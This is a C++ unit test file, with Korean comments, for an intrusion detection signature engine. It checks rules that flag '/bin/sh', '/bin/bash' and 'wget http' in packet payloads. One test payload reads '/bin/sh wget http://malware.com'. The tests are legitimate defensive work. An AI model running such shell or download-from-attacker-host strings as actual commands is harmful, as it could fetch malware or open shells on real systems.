#include <gtest/gtest.h>
#include "ids/signature_engine.hpp"

// ── 기본 탐지 테스트 ──────────────────────────

TEST(SignatureEngineTest, DetectSinglePattern) {
    SignatureEngine engine;
    engine.addRule({"RULE-001", "쉘 탐지", {"/bin/sh"}, "CRITICAL"});
    engine.build();

    PacketInfo pkt;
    pkt.src_ip  = "192.168.1.1";
    pkt.dst_ip  = "192.168.1.2";
    pkt.src_port = 1234;
    pkt.dst_port = 80;
    pkt.protocol = "TCP";

    std::string payload = "GET /exploit /bin/sh HTTP/1.1";
    pkt.payload.assign(payload.begin(), payload.end());

    int threat_count = 0;
    engine.analyze(pkt, [&](const ThreatInfo& threat) {
        threat_count++;
        EXPECT_EQ(threat.rule_id, "RULE-001");
        EXPECT_EQ(threat.matched_pattern, "/bin/sh");
        EXPECT_EQ(threat.severity, "CRITICAL");
    });

    EXPECT_EQ(threat_count, 1);
}

TEST(SignatureEngineTest, DetectMultiplePatterns) {
    SignatureEngine engine;
    engine.addRule({"RULE-001", "쉘 탐지",
                    {"/bin/sh", "/bin/bash"}, "CRITICAL"});
    engine.build();

    PacketInfo pkt;
    pkt.src_ip   = "10.0.0.1";
    pkt.dst_ip   = "10.0.0.2";
    pkt.src_port = 4444;
    pkt.dst_port = 80;
    pkt.protocol = "TCP";

    std::string payload = "/bin/sh and /bin/bash";
    pkt.payload.assign(payload.begin(), payload.end());

    int threat_count = 0;
    engine.analyze(pkt, [&](const ThreatInfo&) {
        threat_count++;
    });

    EXPECT_EQ(threat_count, 2);
}

TEST(SignatureEngineTest, NoDetectionOnEmptyPayload) {
    SignatureEngine engine;
    engine.addRule({"RULE-001", "쉘 탐지", {"/bin/sh"}, "CRITICAL"});
    engine.build();

    PacketInfo pkt;
    pkt.src_ip   = "192.168.1.1";
    pkt.dst_ip   = "192.168.1.2";
    pkt.src_port = 1234;
    pkt.dst_port = 80;
    pkt.protocol = "TCP";
    // payload 비어있음

    int threat_count = 0;
    engine.analyze(pkt, [&](const ThreatInfo&) {
        threat_count++;
    });

    EXPECT_EQ(threat_count, 0);
}

TEST(SignatureEngineTest, NoDetectionOnNonMatchingPayload) {
    SignatureEngine engine;
    engine.addRule({"RULE-001", "쉘 탐지", {"/bin/sh"}, "CRITICAL"});
    engine.build();

    PacketInfo pkt;
    pkt.src_ip   = "192.168.1.1";
    pkt.dst_ip   = "192.168.1.2";
    pkt.src_port = 1234;
    pkt.dst_port = 80;
    pkt.protocol = "TCP";

    std::string payload = "GET /index.html HTTP/1.1";
    pkt.payload.assign(payload.begin(), payload.end());

    int threat_count = 0;
    engine.analyze(pkt, [&](const ThreatInfo&) {
        threat_count++;
    });

    EXPECT_EQ(threat_count, 0);
}

TEST(SignatureEngineTest, MultipleRules) {
    SignatureEngine engine;
    engine.addRule({"RULE-001", "쉘 탐지",     {"/bin/sh"},   "CRITICAL"});
    engine.addRule({"RULE-002", "다운로드 탐지", {"wget http"}, "HIGH"});
    engine.build();

    PacketInfo pkt;
    pkt.src_ip   = "192.168.1.1";
    pkt.dst_ip   = "192.168.1.2";
    pkt.src_port = 1234;
    pkt.dst_port = 80;
    pkt.protocol = "TCP";

    std::string payload = "/bin/sh wget http://malware.com";
    pkt.payload.assign(payload.begin(), payload.end());

    int critical_count = 0;
    int high_count     = 0;

    engine.analyze(pkt, [&](const ThreatInfo& threat) {
        if (threat.severity == "CRITICAL") critical_count++;
        if (threat.severity == "HIGH")     high_count++;
    });

    EXPECT_EQ(critical_count, 1);
    EXPECT_EQ(high_count,     1);
}